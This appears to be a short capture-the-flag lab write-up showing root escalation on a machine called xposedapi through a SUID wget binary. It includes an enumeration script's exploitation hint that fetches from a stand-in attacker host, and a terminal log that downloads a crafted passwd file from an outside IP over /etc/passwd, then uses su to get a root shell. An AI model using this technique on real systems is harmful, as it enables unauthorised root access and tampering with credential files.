# 3 box enum clumsyadmin > root

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/bin/wget
------------------------------


[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/bin/wget -~> https://gtfobins.github.io/gtfobins/wget/#suid
------------------------------


[&] Manual Exploitation (Binaries which create files on the system)
------------------------------
[&] Wget ( /usr/bin/wget )
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
/usr/bin/wget $URL -O $LFILE

------------------------------
```

## wget and modify the /etc/passwd

```
clumsyadmin/k$ /usr/bin/wget http://192.168.49.76/passwd -O /etc/passwd
--2021-09-04 22:52:29--  http://192.168.49.76/passwd
Connecting to 192.168.49.76:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1500 (1.5K) [application/octet-stream]
Saving to: '/etc/passwd'

/etc/passwd         100%[===================>]   1.46K  --.-KB/s    in 0s

2021-09-04 22:52:29 (21.1 MB/s) - '/etc/passwd' saved [1500/1500]

clumsyadmin@xposedapi:/home/clumsyadmin/k$ su kashz
Password:
root@xposedapi:/home/clumsyadmin/k# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
xposedapi
```
